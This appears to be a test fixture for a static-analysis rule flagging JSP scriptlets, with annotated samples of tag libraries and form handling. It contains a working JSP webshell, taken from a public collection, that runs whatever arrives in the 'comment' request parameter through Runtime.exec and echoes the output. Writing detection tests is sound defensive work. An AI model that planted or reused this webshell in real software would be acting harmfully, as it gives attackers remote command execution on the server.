<!-- cf. https://github.com/JoyChou93/webshell/blob/4a2f049afe009f9cc061357b002cff78c06d6c43/jsp/cmd.jsp -->
<!-- ok: no-scriptlets -->
<%@ page import="java.util.*,java.io.*"%>
<!-- ruleid: no-scriptlets -->
<% %>
<%
 if ( request.getParameter( "comment" ) != null )
 {
     out.println( "Command: " + request.getParameter( "comment" ) + "<BR>" );
     Process p        = Runtime.getRuntime().exec( request.getParameter( "comment" ) );
     OutputStream os    = p.getOutputStream();
     InputStream in        = p.getInputStream();
     DataInputStream dis    = new DataInputStream( in );
     String disr        = dis.readLine();
     while ( disr != null )
     {
         out.println( disr ); disr = dis.readLine();
     }
 }
 %>
 
<%@ taglib uri=http://java.sun.com/jstl/sql%>
<%@ taglib prefix="c" uri=http://java.sun.com/jstl/core%>
<%@ taglib prefix="c" uri=http://java.sun.com/jstl/xml%>
<%@ taglib uri=http://xmlns.oracle.com/uix/ui 
xmlns:ui="http://java.sun.com/jsf/facelets"%>
<%@ taglib prefix="productTracking" uri=http://www.bea.com/servers/portal/commerce/tags/productTracking" %>
<productTracking:displayProductEvent %>
<productTracking:clickProductEvent %>

<HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION="">
<INPUT TYPE="text" NAME="comment">
<INPUT TYPE="submit" VALUE="Send">
</FORM> <pre> 
<!-- ruleid: no-scriptlets -->
<!-- VIOLAZ -->
<!-- VIOLAZ -->
<tsx:dbconnect
    <font color="red"><userid></font>     <!-- VIOLAZ -->
    <tsx:getProperty name="request" property=request.getParameter("userid") />    
    <font color="red"></userid></font>     
   <font color="red"><passwd></font> <!-- VIOLAZ -->
   <tsx:getProperty name="request" property=request.getParameter("passwd") />     
    <font color="red"></passwd></font>     
</tsx:dbconnect>

<jml:useVariable id = "isValidUser" type = "boolean" value = "<%= dbConn.isValid() %>" scope = "session" /> <!-- VIOLAZ -->
<jml:useForm id = "user" type = "string" param = "user" scope = "session" /> <!-- VIOLAZ -->
<jml:useCookie id = "user" type = "string" cookie = "user" scope = "request" /> <!-- VIOLAZ -->
<jml:remove id = "user" scope = "session" />  <!-- VIOLAZ -->
<jml:if condition = "<%= !currTS.isEmpty() %>" > <!-- VIOLAZ -->
     <S>(size: <%= currTS.getValue().toUpperCase() %>)</S>&nbsp 
</jml:if>
<jml:choose> <!-- VIOLAZ -->
     <jml:when condition = "<%= orderedItem.getValue() %>"  > <!-- VIOLAZ -->
          You have changed your order:
             -- output the current order --
     </jml:when>
     <jml:otherwise> <!-- VIOLAZ -->
          Are you sure we can't interest you in something, cheapskate?
     </jml:otherwise>
</jml:choose>

 </pre>
 </BODY></HTML>
